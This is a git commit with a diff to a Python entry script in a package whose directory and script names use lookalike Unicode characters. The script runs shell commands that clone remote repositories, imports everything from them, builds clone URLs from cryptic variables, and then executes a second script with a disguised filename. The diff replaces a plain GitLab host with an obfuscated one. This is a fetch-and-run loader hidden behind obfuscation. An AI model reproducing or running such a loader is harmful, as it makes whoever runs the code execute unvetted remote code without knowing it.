33e4320d64d29b971000af69dddbfc833b6afc6c
hypevoidsouls <hypevoidsoul@yahoo.com>
2021-07-07 09:01:14 +0530

    rm

--- ᎥᏁᏦᎥᏦᏒᎩᎩ/__main__.py
+++ ᎥᏁᏦᎥᏦᏒᎩᎩ/__main__.py
@@ -2,6 +2,5 @@ from HEIST import *
 os.system("git clone https://github.com/hypevoidsouls/knite.git")
 from knite import *
 os.system("git clone https://{}/{}/{}.git".format(DTNO,BASH,KASH))
-os.system("git clone https://gitlab.com/{}/{}.git".format(BASH,TASH))
+os.system("git clone https://{}/{}/{}.git".format(DTNO,BASH,TASH))
 os.system("python3 Ӽɛʀօռօɨɖ.py")
-
